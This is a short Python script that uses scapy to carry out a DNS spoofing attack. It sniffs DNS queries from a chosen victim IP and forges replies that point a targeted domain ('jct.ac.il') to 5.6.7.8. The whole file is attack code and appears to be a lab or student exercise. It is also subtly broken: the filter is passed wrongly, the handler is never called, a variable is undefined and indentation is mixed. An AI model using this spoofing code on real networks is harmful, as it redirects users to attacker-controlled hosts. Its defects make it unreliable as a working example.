from scapy.all import *

WANTED_IP_ADDRESS = ""


def dns_filter(packet):
    return DNSQR in packet and packet[IP].src == WANTED_IP_ADDRESS


def create_spoof(packet):
    ret = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=53)
    ret = ret/DNS(id=packet[DNS].id, qr=1, rd=packet[DNS].rd, qdcount=1, qd=packet[DNS].qd,
                    ancount=1, an=DNSRR(rrname=packet[DNSQR].qname, ttl=3600, rdata='5.6.7.8'))
    send(ret)
    ret.show()


def dns_func(packet):
    print("Got a DNS")
    packet.show()
    if 'jct.ac.il' in pkt['DNSQR'].qname:
		create_spoof(packet)


def main():
    sniff(filter=dns_filter)


if __name__ == '__main__':
    main()
